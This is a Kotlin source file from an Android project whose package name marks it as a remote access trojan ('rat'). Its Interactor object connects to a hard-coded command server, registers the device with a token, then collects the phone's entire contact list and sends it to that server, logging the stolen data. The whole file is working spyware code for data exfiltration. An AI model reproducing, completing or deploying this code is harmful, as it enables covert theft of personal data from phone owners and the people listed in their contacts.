package ru.awawa.rat.server

import android.util.Log
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.GlobalScope
import kotlinx.coroutines.launch
import ru.awawa.rat.Application
import ru.awawa.rat.helper.ContactsHelper
import ru.awawa.rat.helper.Preferences
import java.net.InetSocketAddress
import java.net.Socket
import java.net.SocketException

object Interactor {

    private const val TAG = "Interactor"
    private const val SERVER_IP = "10.0.2.2"
    private const val SERVER_PORT = 33455

    private val socket = Socket()

    fun sendToken() {
        GlobalScope.launch(Dispatchers.IO) {
            try {
                socket.connect(InetSocketAddress(SERVER_IP, SERVER_PORT))
            } catch(ex: SocketException) {}
            val token = Preferences.get<String>(Preferences.PreferencesField.TOKEN) ?: ""
            socket.getOutputStream().write("connect:|:$token\n".toByteArray())
            val result = socket.getInputStream().readBytes().decodeToString().split(":|:")
            if (result[0] == "ok") {
                Preferences.set(Preferences.PreferencesField.UUID, result.getOrElse(1){ "" })
            } else {
                val error = result.getOrElse(1) { "" }
                Log.e(TAG, "Server answered with error when token sent: $error")
            }
        }
    }

    fun sendContacts() {
        GlobalScope.launch(Dispatchers.IO) {
            try {
                socket.connect(InetSocketAddress(SERVER_IP, SERVER_PORT))
            } catch(ex: SocketException) {}
            finally {

                val uuid = Preferences.get<String>(Preferences.PreferencesField.UUID) ?: ""
                val contacts = ContactsHelper.getContacts(Application.context)
                socket.getOutputStream().write("contacts:|:$uuid:|:$contacts\n".toByteArray())
                Log.w(TAG, "Sent: contacts:|:$uuid:|:$contacts")

                val result = socket.getInputStream().readBytes().decodeToString().split(":|:")
                if (result[0] != "ok") {
                    val error = result.getOrElse(1) { "" }
                    Log.e(TAG, "Server answered with an error when contacts sent: $error")
                }
            }
        }
    }
}